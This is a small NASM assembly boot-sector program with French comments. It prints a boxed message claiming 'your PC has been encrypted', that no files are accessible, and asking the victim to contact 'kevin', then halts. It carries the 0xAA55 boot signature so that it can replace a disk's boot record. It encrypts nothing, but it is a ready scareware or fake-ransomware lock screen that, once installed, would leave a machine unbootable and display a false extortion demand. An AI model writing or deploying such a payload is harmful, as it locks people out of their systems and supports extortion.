bits 16
org 0x7c00                ; Adresse de chargement par le BIOS

; Initialisation des segments
xor ax, ax
mov ds, ax
mov es, ax

; Pointeur sur le message
mov si, message
mov ah, 0x0E             ; Fonction BIOS pour afficher un caractère (TTY)

.print_loop:
    lodsb                ; AL ← [DS:SI], SI++
    cmp al, 0
    je .done
    int 0x10             ; Affiche AL
    jmp .print_loop

.done:
    hlt                  ; Boucle infinie de halt

; Message ASCII - peut être modifié à volonté (ne pas dépasser 510 octets au total)
message db 13,10
        db "################################",13,10
        db "#                                  #",13,10
        db "#     your PC has been encrypted   #",13,10
        db "#                                  #",13,10
        db "#    NO FILES ARE ACCESSIBLE       #",13,10
        db "#   Please contact me              #",13,10
        db "#      i am kevin                  #",13,10
        db "#                                  #",13,10
        db "################################",13,10,0

; Padding jusqu’à 510 octetsc
times 510 - ($ - $$) db 0

; Signature d’amorçage
dw 0xAA55
